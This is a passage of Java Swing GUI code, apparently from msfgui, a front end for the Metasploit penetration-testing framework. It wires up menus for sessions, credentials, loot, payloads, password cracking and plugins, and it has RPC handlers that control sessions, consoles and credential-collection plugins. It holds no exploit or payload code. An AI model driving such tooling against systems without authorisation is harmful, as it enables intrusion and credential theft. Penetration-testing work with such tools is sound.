        sessionsViewItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                sessionsViewItemActionPerformed(evt);
            }
        });
        viewMenu.add(sessionsViewItem);

        hostsViewItem.setMnemonic('h');
        hostsViewItem.setText(resourceMap.getString("hostsViewItem.text")); // NOI18N
        hostsViewItem.setName("hostsViewItem"); // NOI18N
        hostsViewItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                hostsViewItemActionPerformed(evt);
            }
        });
        viewMenu.add(hostsViewItem);

        clientsViewItem.setMnemonic('c');
        clientsViewItem.setText(resourceMap.getString("clientsViewItem.text")); // NOI18N
        clientsViewItem.setName("clientsViewItem"); // NOI18N
        clientsViewItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                clientsViewItemActionPerformed(evt);
            }
        });
        viewMenu.add(clientsViewItem);

        servicesViewItem.setMnemonic('r');
        servicesViewItem.setText(resourceMap.getString("servicesViewItem.text")); // NOI18N
        servicesViewItem.setName("servicesViewItem"); // NOI18N
        servicesViewItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                servicesViewItemActionPerformed(evt);
            }
        });
        viewMenu.add(servicesViewItem);

        vulnsViewItem.setMnemonic('v');
        vulnsViewItem.setText(resourceMap.getString("vulnsViewItem.text")); // NOI18N
        vulnsViewItem.setName("vulnsViewItem"); // NOI18N
        vulnsViewItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                vulnsViewItemActionPerformed(evt);
            }
        });
        viewMenu.add(vulnsViewItem);

        eventsViewItem.setMnemonic('e');
        eventsViewItem.setText(resourceMap.getString("eventsViewItem.text")); // NOI18N
        eventsViewItem.setName("eventsViewItem"); // NOI18N
        eventsViewItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                eventsViewItemActionPerformed(evt);
            }
        });
        viewMenu.add(eventsViewItem);

        notesViewItem.setMnemonic('n');
        notesViewItem.setText(resourceMap.getString("notesViewItem.text")); // NOI18N
        notesViewItem.setName("notesViewItem"); // NOI18N
        notesViewItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                notesViewItemActionPerformed(evt);
            }
        });
        viewMenu.add(notesViewItem);

        credsViewItem.setMnemonic('C');
        credsViewItem.setText(resourceMap.getString("credsViewItem.text")); // NOI18N
        credsViewItem.setName("credsViewItem"); // NOI18N
        credsViewItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                credsViewItemActionPerformed(evt);
            }
        });
        viewMenu.add(credsViewItem);

        lootsViewItem.setMnemonic('l');
        lootsViewItem.setText(resourceMap.getString("lootsViewItem.text")); // NOI18N
        lootsViewItem.setName("lootsViewItem"); // NOI18N
        lootsViewItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                lootsViewItemActionPerformed(evt);
            }
        });
        viewMenu.add(lootsViewItem);

        menuBar.add(viewMenu);

        exploitsMenu.setMnemonic('E');
        exploitsMenu.setText(resourceMap.getString("exploitsMenu.text")); // NOI18N
        exploitsMenu.setEnabled(false);
        exploitsMenu.setName("exploitsMenu"); // NOI18N
        menuBar.add(exploitsMenu);

        auxiliaryMenu.setMnemonic('A');
        auxiliaryMenu.setText(resourceMap.getString("auxiliaryMenu.text")); // NOI18N
        auxiliaryMenu.setEnabled(false);
        auxiliaryMenu.setName("auxiliaryMenu"); // NOI18N
        menuBar.add(auxiliaryMenu);

        payloadsMenu.setMnemonic('P');
        payloadsMenu.setText(resourceMap.getString("payloadsMenu.text")); // NOI18N
        payloadsMenu.setEnabled(false);
        payloadsMenu.setName("payloadsMenu"); // NOI18N
        menuBar.add(payloadsMenu);

        historyMenu.setMnemonic('H');
        historyMenu.setText(resourceMap.getString("historyMenu.text")); // NOI18N
        historyMenu.setName("historyMenu"); // NOI18N

        recentMenu.setMnemonic('R');
        recentMenu.setText(resourceMap.getString("recentMenu.text")); // NOI18N
        recentMenu.setEnabled(false);
        recentMenu.setName("recentMenu"); // NOI18N
        historyMenu.add(recentMenu);

        clearHistoryItem.setMnemonic('H');
        clearHistoryItem.setText(resourceMap.getString("clearHistoryItem.text")); // NOI18N
        clearHistoryItem.setName("clearHistoryItem"); // NOI18N
        clearHistoryItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                clearHistoryItemActionPerformed(evt);
            }
        });
        historyMenu.add(clearHistoryItem);

        menuBar.add(historyMenu);

        postMenu.setMnemonic('t');
        postMenu.setText(resourceMap.getString("postMenu.text")); // NOI18N
        postMenu.setEnabled(false);
        postMenu.setName("postMenu"); // NOI18N

        menuRunAllMeterp.setMnemonic('R');
        menuRunAllMeterp.setText(resourceMap.getString("menuRunAllMeterp.text")); // NOI18N
        menuRunAllMeterp.setName("menuRunAllMeterp"); // NOI18N
        postMenu.add(menuRunAllMeterp);

        crackPasswordsItem.setMnemonic('C');
        crackPasswordsItem.setText(resourceMap.getString("crackPasswordsItem.text")); // NOI18N
        crackPasswordsItem.setName("crackPasswordsItem"); // NOI18N
        crackPasswordsItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                crackPasswordsItemActionPerformed(evt);
            }
        });
        postMenu.add(crackPasswordsItem);

        killSessionsMenuItem.setMnemonic('K');
        killSessionsMenuItem.setText(resourceMap.getString("killSessionsMenuItem.text")); // NOI18N
        killSessionsMenuItem.setName("killSessionsMenuItem"); // NOI18N
        killSessionsMenuItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                killSessionsMenuItemActionPerformed(evt);
            }
        });
        postMenu.add(killSessionsMenuItem);

        logGenerateMenuItem.setMnemonic('G');
        logGenerateMenuItem.setText(resourceMap.getString("logGenerateMenuItem.text")); // NOI18N
        logGenerateMenuItem.setName("logGenerateMenuItem"); // NOI18N
        logGenerateMenuItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                logGenerateMenuItemActionPerformed(evt);
            }
        });
        postMenu.add(logGenerateMenuItem);

        menuBar.add(postMenu);

        consoleMenu.setMnemonic('C');
        consoleMenu.setText(resourceMap.getString("consoleMenu.text")); // NOI18N
        consoleMenu.setEnabled(false);
        consoleMenu.setName("consoleMenu"); // NOI18N

        newConsoleItem.setMnemonic('N');
        newConsoleItem.setText(resourceMap.getString("newConsoleItem.text")); // NOI18N
        newConsoleItem.setName("newConsoleItem"); // NOI18N
        newConsoleItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                newConsoleItemActionPerformed(evt);
            }
        });
        consoleMenu.add(newConsoleItem);

        existingConsoleMenu.setMnemonic('O');
        existingConsoleMenu.setText(resourceMap.getString("existingConsoleMenu.text")); // NOI18N
        existingConsoleMenu.setName("existingConsoleMenu"); // NOI18N
        consoleMenu.add(existingConsoleMenu);

        closeConsoleMenu.setMnemonic('C');
        closeConsoleMenu.setText(resourceMap.getString("closeConsoleMenu.text")); // NOI18N
        closeConsoleMenu.setName("closeConsoleMenu"); // NOI18N
        consoleMenu.add(closeConsoleMenu);

        refreshConsolesItem.setMnemonic('R');
        refreshConsolesItem.setText(resourceMap.getString("refreshConsolesItem.text")); // NOI18N
        refreshConsolesItem.setName("refreshConsolesItem"); // NOI18N
        refreshConsolesItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                refreshConsolesItemActionPerformed(evt);
            }
        });
        consoleMenu.add(refreshConsolesItem);

        menuBar.add(consoleMenu);

        databaseMenu.setMnemonic('D');
        databaseMenu.setText(resourceMap.getString("databaseMenu.text")); // NOI18N
        databaseMenu.setEnabled(false);
        databaseMenu.setName("databaseMenu"); // NOI18N

        connectItem.setMnemonic('C');
        connectItem.setText(resourceMap.getString("connectItem.text")); // NOI18N
        connectItem.setName("connectItem"); // NOI18N
        connectItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                connectItemActionPerformed(evt);
            }
        });
        databaseMenu.add(connectItem);

        disconnectItem.setMnemonic('D');
        disconnectItem.setText(resourceMap.getString("disconnectItem.text")); // NOI18N
        disconnectItem.setName("disconnectItem"); // NOI18N
        disconnectItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                disconnectItemActionPerformed(evt);
            }
        });
        databaseMenu.add(disconnectItem);

        refreshItem.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_F5, 0));
        refreshItem.setMnemonic('R');
        refreshItem.setText(resourceMap.getString("refreshItem.text")); // NOI18N
        refreshItem.setName("refreshItem"); // NOI18N
        refreshItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                refreshItemActionPerformed(evt);
            }
        });
        databaseMenu.add(refreshItem);

        nmapItem.setMnemonic('N');
        nmapItem.setText(resourceMap.getString("nmapItem.text")); // NOI18N
        nmapItem.setName("nmapItem"); // NOI18N
        nmapItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                nmapItemActionPerformed(evt);
            }
        });
        databaseMenu.add(nmapItem);

        importItem.setMnemonic('I');
        importItem.setText(resourceMap.getString("importItem.text")); // NOI18N
        importItem.setName("importItem"); // NOI18N
        importItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                importItemActionPerformed(evt);
            }
        });
        databaseMenu.add(importItem);

        dbExportItem.setMnemonic('E');
        dbExportItem.setText(resourceMap.getString("dbExportItem.text")); // NOI18N
        dbExportItem.setName("dbExportItem"); // NOI18N
        dbExportItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                dbExportItemActionPerformed(evt);
            }
        });
        databaseMenu.add(dbExportItem);

        currWorkspaceItem.setMnemonic('W');
        currWorkspaceItem.setText(resourceMap.getString("currWorkspaceItem.text")); // NOI18N
        currWorkspaceItem.setName("currWorkspaceItem"); // NOI18N
        currWorkspaceItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                currWorkspaceItemActionPerformed(evt);
            }
        });
        databaseMenu.add(currWorkspaceItem);

        addWorkspaceItem.setMnemonic('A');
        addWorkspaceItem.setText(resourceMap.getString("addWorkspaceItem.text")); // NOI18N
        addWorkspaceItem.setName("addWorkspaceItem"); // NOI18N
        addWorkspaceItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                addWorkspaceItemActionPerformed(evt);
            }
        });
        databaseMenu.add(addWorkspaceItem);

        delWorkspaceItem.setMnemonic('l');
        delWorkspaceItem.setText(resourceMap.getString("delWorkspaceItem.text")); // NOI18N
        delWorkspaceItem.setName("delWorkspaceItem"); // NOI18N
        delWorkspaceItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                delWorkspaceItemActionPerformed(evt);
            }
        });
        databaseMenu.add(delWorkspaceItem);

        menuBar.add(databaseMenu);

        pluginsMenu.setMnemonic('l');
        pluginsMenu.setText(resourceMap.getString("pluginsMenu.text")); // NOI18N
        pluginsMenu.setEnabled(false);
        pluginsMenu.setName("pluginsMenu"); // NOI18N

        autoAddRouteItem.setMnemonic('A');
        autoAddRouteItem.setText(resourceMap.getString("autoAddRouteItem.text")); // NOI18N
        autoAddRouteItem.setName("autoAddRouteItem"); // NOI18N
        autoAddRouteItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                autoAddRouteItemActionPerformed(evt);
            }
        });
        pluginsMenu.add(autoAddRouteItem);

        soundItem.setMnemonic('S');
        soundItem.setText(resourceMap.getString("soundItem.text")); // NOI18N
        soundItem.setName("soundItem"); // NOI18N
        soundItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                soundItemActionPerformed(evt);
            }
        });
        pluginsMenu.add(soundItem);

        dbCredcollectItem.setMnemonic('c');
        dbCredcollectItem.setText(resourceMap.getString("dbCredcollectItem.text")); // NOI18N
        dbCredcollectItem.setName("dbCredcollectItem"); // NOI18N
        dbCredcollectItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                dbCredcollectItemActionPerformed(evt);
            }
        });
        pluginsMenu.add(dbCredcollectItem);

        dbTrackerItem.setMnemonic('t');
        dbTrackerItem.setText(resourceMap.getString("dbTrackerItem.text")); // NOI18N
        dbTrackerItem.setName("dbTrackerItem"); // NOI18N
        dbTrackerItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                dbTrackerItemActionPerformed(evt);
            }
        });
        pluginsMenu.add(dbTrackerItem);

        socketLoggerItem.setMnemonic('k');
        socketLoggerItem.setText(resourceMap.getString("socketLoggerItem.text")); // NOI18N
        socketLoggerItem.setName("socketLoggerItem"); // NOI18N
        socketLoggerItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                socketLoggerItemActionPerformed(evt);
            }
        });
        pluginsMenu.add(socketLoggerItem);

        ipsFilterItem.setMnemonic('I');
        ipsFilterItem.setText(resourceMap.getString("ipsFilterItem.text")); // NOI18N
        ipsFilterItem.setName("ipsFilterItem"); // NOI18N
        ipsFilterItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                ipsFilterItemActionPerformed(evt);
            }
        });
        pluginsMenu.add(ipsFilterItem);

        otherPluginItem.setMnemonic('O');
        otherPluginItem.setText(resourceMap.getString("otherPluginItem.text")); // NOI18N
        otherPluginItem.setName("otherPluginItem"); // NOI18N
        otherPluginItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                otherPluginItemActionPerformed(evt);
            }
        });
        pluginsMenu.add(otherPluginItem);

        unloadPluginItem.setMnemonic('U');
        unloadPluginItem.setText(resourceMap.getString("unloadPluginItem.text")); // NOI18N
        unloadPluginItem.setName("unloadPluginItem"); // NOI18N
        unloadPluginItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                unloadPluginItemActionPerformed(evt);
            }
        });
        pluginsMenu.add(unloadPluginItem);

        menuBar.add(pluginsMenu);

        helpMenu.setMnemonic('H');
        helpMenu.setText(resourceMap.getString("helpMenu.text")); // NOI18N
        helpMenu.setName("helpMenu"); // NOI18N

        onlineHelpMenu.setMnemonic('O');
        onlineHelpMenu.setText(resourceMap.getString("onlineHelpMenu.text")); // NOI18N
        onlineHelpMenu.setName("onlineHelpMenu"); // NOI18N
        onlineHelpMenu.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                onlineHelpMenuActionPerformed(evt);
            }
        });
        helpMenu.add(onlineHelpMenu);

        aboutMenuItem.setAction(actionMap.get("showAboutBox")); // NOI18N
        aboutMenuItem.setName("aboutMenuItem"); // NOI18N
        helpMenu.add(aboutMenuItem);

        menuBar.add(helpMenu);

        statusPanel.setName("statusPanel"); // NOI18N

        statusMessageLabel.setName("statusMessageLabel"); // NOI18N

        statusAnimationLabel.setHorizontalAlignment(javax.swing.SwingConstants.LEFT);
        statusAnimationLabel.setName("statusAnimationLabel"); // NOI18N

        progressBar.setName("progressBar"); // NOI18N

        javax.swing.GroupLayout statusPanelLayout = new javax.swing.GroupLayout(statusPanel);
        statusPanel.setLayout(statusPanelLayout);
        statusPanelLayout.setHorizontalGroup(
            statusPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(statusPanelLayout.createSequentialGroup()
                .addContainerGap()
                .addComponent(statusMessageLabel)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 696, Short.MAX_VALUE)
                .addComponent(progressBar, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(statusAnimationLabel)
                .addContainerGap())
        );
        statusPanelLayout.setVerticalGroup(
            statusPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, statusPanelLayout.createSequentialGroup()
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addGroup(statusPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(statusMessageLabel)
                    .addComponent(statusAnimationLabel)
                    .addComponent(progressBar, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addGap(12, 12, 12))
        );

        setComponent(mainPanel);
        setMenuBar(menuBar);
        setStatusBar(statusPanel);
    }// </editor-fold>//GEN-END:initComponents

	private void exitMenuItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_exitMenuItemActionPerformed
		if(confirmStop())
			System.exit(0);
	}//GEN-LAST:event_exitMenuItemActionPerformed

	private void connectRpcMenuItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_connectRpcMenuItemActionPerformed
		connectRpc();
		if(rpcConn != null)
			handleNewRpcConnection();
	}//GEN-LAST:event_connectRpcMenuItemActionPerformed

	private void clearHistoryItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_clearHistoryItemActionPerformed
		MsfguiApp.clearHistory(recentMenu);
	}//GEN-LAST:event_clearHistoryItemActionPerformed

	private void onlineHelpMenuActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_onlineHelpMenuActionPerformed
		try{
			java.awt.Desktop.getDesktop().browse(new URI("http://www.metasploit.com/framework/support"));
		} catch (IOException ex){
			MsfguiApp.showMessage(this.getFrame(), "Can't open browser. See http://www.metasploit.com/framework/support");
		} catch ( URISyntaxException usx){
			MsfguiApp.showMessage(this.getFrame(), "Can't find the URL. This really should never happen. Report this bug.");
		}
	}//GEN-LAST:event_onlineHelpMenuActionPerformed

	private void logGenerateMenuItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_logGenerateMenuItemActionPerformed
		try{
			java.awt.Desktop.getDesktop().browse(new URI("file://"+MsfguiApp.cleanBackslashes(MsfguiLog.defaultLog.save())));
		}catch (Exception iox){
			MsfguiApp.fileChooser.setCurrentDirectory(new File(MsfguiApp.getTempFolder()));
			MsfguiApp.fileChooser.setSelectedFile(new File("msfguilog.html"));
			try{
				if(MsfguiApp.fileChooser.showSaveDialog(this.getFrame()) == JFileChooser.APPROVE_OPTION)
					java.awt.Desktop.getDesktop().browse(new URI("file://"+MsfguiLog.defaultLog.save(
							MsfguiApp.cleanBackslashes(MsfguiApp.fileChooser.getSelectedFile().getAbsolutePath()))));
			}catch (Exception ex){
				MsfguiApp.showMessage(getFrame(), "Problem "+ex);
			}
		}
	}//GEN-LAST:event_logGenerateMenuItemActionPerformed

	private void killSessionsMenuItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_killSessionsMenuItemActionPerformed
		for( Object sesObj : sessionsTableModel.sessions ){
			try{
				rpcConn.execute("session.stop", ((Map)sesObj).get("id"));
			} catch (MsfException xre) {
				statusMessageLabel.setText("Error killing session "+((Map)sesObj).get("id"));
			}
		}
	}//GEN-LAST:event_killSessionsMenuItemActionPerformed

	private void newConsoleItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_newConsoleItemActionPerformed
		try{
			Map res = (Map)rpcConn.execute("console.create");
			registerConsole(res, true, "");
		}catch(MsfException mex){
			MsfguiApp.showMessage(getFrame(), mex);
		}
}//GEN-LAST:event_newConsoleItemActionPerformed

	private void searchItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_searchItemActionPerformed
		searchWin.setVisible(true);
	}//GEN-LAST:event_searchItemActionPerformed

	private void connectItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_connectItemActionPerformed
		if(DbConnectDialog.connect(getFrame(), rpcConn))
			new SwingWorker(){
				protected Object doInBackground() throws Exception {
					reloadDb(true);
					return null;
				}
			}.execute();
	}//GEN-LAST:event_connectItemActionPerformed

	/** Refreshes the database tables. */
	private void reloadDb(boolean all) {
		try { //First try to reset workspace to chosen workspace
			if(MsfguiApp.getPropertiesNode().containsKey("workspace"))
				rpcConn.execute("db.set_workspace", MsfguiApp.getPropertiesNode().get("workspace"));
		} catch (MsfException mex) {
			if(!mex.getMessage().equals("database not loaded"))
				mex.printStackTrace();
		}
		try { //Now load data out of current workspace
			MsfguiApp.workspace = ((Map) rpcConn.execute("db.current_workspace")).get("workspace").toString();
			for(MsfTable table : tables){
				table.rpcConn = rpcConn;
				table.reAddQuery(all, 0);
			}
		} catch (MsfException mex) {
			if(!mex.getMessage().equals("database not loaded"))
				mex.printStackTrace();
		}
		MsfFrame.updateSizes(getFrame());
	}

	private void refreshItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_refreshItemActionPerformed
		reloadDb(false);
	}//GEN-LAST:event_refreshItemActionPerformed

	private void importItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_importItemActionPerformed
		try {
			Object filetype = JOptionPane.showInputDialog(getFrame(), "Select file type. Autodetect recommended.",
					"Type selection", JOptionPane.PLAIN_MESSAGE,null, new Object[]{"Autodetect","Msfe XML",
					"Nexpose simpleXML","Nexpose rawXML", "Nmap XML", "Nessuse NBE","Nessus XML", "Nessus XML v2",
					"Qualsys XML", "IP list", "Amap log", "Amap mlog"}, onlineHelpMenu);
			String type;
			if(filetype == null)
				return;
			else if(filetype.equals("Autodetect"))
				type = "data";
			else
				type = filetype.toString().toLowerCase().replaceAll(" ", "_");
			HashMap argHash = new HashMap();
			if (MsfguiApp.fileChooser.showOpenDialog(getFrame()) == javax.swing.JFileChooser.CANCEL_OPTION)
				return;
			int fsize = (int)MsfguiApp.fileChooser.getSelectedFile().length();
			FileInputStream fin = new FileInputStream(MsfguiApp.fileChooser.getSelectedFile());
			byte[] data = new byte[fsize];
			fin.read(data);
			argHash.put("data", data);
			rpcConn.execute("db.import_"+type,argHash);
		} catch (MsfException mex) {
			MsfguiApp.showMessage(getFrame(), mex);
		} catch (IOException iex) {
			MsfguiApp.showMessage(getFrame(), iex);
		}
	}//GEN-LAST:event_importItemActionPerformed

	private void disconnectItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_disconnectItemActionPerformed
		try {
			rpcConn.execute("db.disconnect");
		} catch (MsfException mex) {
			MsfguiApp.showMessage(getFrame(), mex);
		}
	}//GEN-LAST:event_disconnectItemActionPerformed

	private void loadPlugin(String plugin){
		try {
			rpcConn.execute("plugin.load",plugin, new HashMap());
			MsfguiApp.showMessage(getFrame(), "Plugin "+plugin+" loaded.");
		} catch (MsfException mex) {
			MsfguiApp.showMessage(getFrame(), mex);
		}
	}
	private void otherPluginItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_otherPluginItemActionPerformed
		String plugin = JOptionPane.showInputDialog(getFrame(),"Enter the name of a plugin","Plugin loader",JOptionPane.QUESTION_MESSAGE);
		if(plugin != null && plugin.length() > 0)
			loadPlugin(plugin);
	}//GEN-LAST:event_otherPluginItemActionPerformed

	private void ipsFilterItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_ipsFilterItemActionPerformed
		loadPlugin("ips_filter");
	}//GEN-LAST:event_ipsFilterItemActionPerformed

	private void socketLoggerItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_socketLoggerItemActionPerformed
		loadPlugin("socket_logger");
	}//GEN-LAST:event_socketLoggerItemActionPerformed

	private void dbTrackerItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_dbTrackerItemActionPerformed
		loadPlugin("db_tracker");
	}//GEN-LAST:event_dbTrackerItemActionPerformed

	private void soundItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_soundItemActionPerformed
		loadPlugin("sounds");
	}//GEN-LAST:event_soundItemActionPerformed

	private void autoAddRouteItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_autoAddRouteItemActionPerformed
		loadPlugin("auto_add_route");
	}//GEN-LAST:event_autoAddRouteItemActionPerformed

	private void dbCredcollectItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_dbCredcollectItemActionPerformed
		loadPlugin("db_credcollect");
	}//GEN-LAST:event_dbCredcollectItemActionPerformed

	private void unloadPluginItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_unloadPluginItemActionPerformed
		try {
			Object[] plugins = ((List)((Map)rpcConn.execute("plugin.loaded")).get("plugins")).toArray();
			Object plugin = JOptionPane.showInputDialog(getFrame(), "Choose a plugin to unload", "Unload plugin",
					JOptionPane.PLAIN_MESSAGE, null, plugins, plugins[0]);
			if(plugin == null)
				return;
			rpcConn.execute("plugin.unload",plugin);
		} catch (MsfException mex) {
			MsfguiApp.showMessage(getFrame(), mex);
		}
	}//GEN-LAST:event_unloadPluginItemActionPerformed

	private void showDetailsItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_showDetailsItemActionPerformed
		JOptionPane.showMessageDialog(getFrame(), rpcConn.toString(), "Connection Details", JOptionPane.INFORMATION_MESSAGE);
	}//GEN-LAST:event_showDetailsItemActionPerformed

	private String[] tableShortNames = new String[]{"","",};
	private void tableDelCheck(KeyEvent evt, String name, String[] colNames){
		if(evt.getKeyCode() == KeyEvent.VK_F5)
			reloadDb(false);
		if(evt.getKeyCode() != KeyEvent.VK_DELETE)
			return;
		MsfTable tab = (MsfTable)evt.getSource();
		for(int row : tab.getSelectedRows()){
			try {
				HashMap map = new HashMap();
				for(int i = 0; i < colNames.length; i++)
					map.put(colNames[i], tab.getValueAt(row,i));
				rpcConn.execute("db.del_"+name,map);
			} catch (MsfException mex) {
				MsfguiApp.showMessage(getFrame(), mex);
			}
		}//delete then readd
		tab.reAddQuery(true, 0);
	}
	private void hostsTableKeyReleased(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_hostsTableKeyReleased
		tableDelCheck(evt,"host",new String[]{"created_at","address","address6","mac","name","state","os_name",
				"os_flavor","os_sp","os_lang","updated_at","purpose","info"});
	}//GEN-LAST:event_hostsTableKeyReleased

	private void servicesTableKeyReleased(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_servicesTableKeyReleased
		tableDelCheck(evt,"service",new String[]{"host","created_at","updated_at","port","proto","state","name","info"});
	}//GEN-LAST:event_servicesTableKeyReleased

	private void vulnsTableKeyReleased(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_vulnsTableKeyReleased
		tableDelCheck(evt,"vuln",new String[]{"port","proto","time","host","name","refs"});
	}//GEN-LAST:event_vulnsTableKeyReleased

	private void notesTableKeyReleased(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_notesTableKeyReleased
		tableDelCheck(evt,"note",new String[]{"time", "host", "service", "type", "data"});
	}//GEN-LAST:event_notesTableKeyReleased

	private void lootsTableKeyReleased(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_lootsTableKeyReleased
		((MsfTable)lootsTable).reAddQuery(true, 0);
	}//GEN-LAST:event_lootsTableKeyReleased

	private void clientsTableKeyReleased(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_clientsTableKeyReleased
		tableDelCheck(evt,"client",new String[]{"host","ua_string","ua_name","ua_ver","created_at","updated_at"});
	}//GEN-LAST:event_clientsTableKeyReleased

	private void currWorkspaceItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_currWorkspaceItemActionPerformed
		try {
			Object[] vals = ((List)((Map)rpcConn.execute("db.workspaces")).get("workspaces")).toArray();
			Object[] names = new Object[vals.length];
			for(int i = 0; i < vals.length; i++)
				names[i] = ((Map)vals[i]).get("name");
			Object selected = JOptionPane.showInputDialog(getFrame(),"Select a workspace","Workspace selection",
					JOptionPane.QUESTION_MESSAGE,null, names, MsfguiApp.workspace);
			if(selected == null)
				return;
			MsfguiApp.workspace = selected.toString();
			rpcConn.execute("db.set_workspace", MsfguiApp.workspace);
			MsfguiApp.getPropertiesNode().put("workspace", MsfguiApp.workspace);
			reloadDb(true);
		} catch (MsfException mex) {
			MsfguiApp.showMessage(getFrame(), mex);
		}
	}//GEN-LAST:event_currWorkspaceItemActionPerformed

	private void addWorkspaceItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_addWorkspaceItemActionPerformed
		try {
			String name = JOptionPane.showInputDialog(getFrame(), "Enter a name for the new workspace");
			if(name != null)
				rpcConn.execute("db.add_workspace",name);
			MsfguiApp.workspace = name;
			rpcConn.execute("db.set_workspace", name);
			reloadDb(true);
		} catch (MsfException mex) {
			MsfguiApp.showMessage(getFrame(), mex);
		}
	}//GEN-LAST:event_addWorkspaceItemActionPerformed

	private void delWorkspaceItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_delWorkspaceItemActionPerformed
		try {
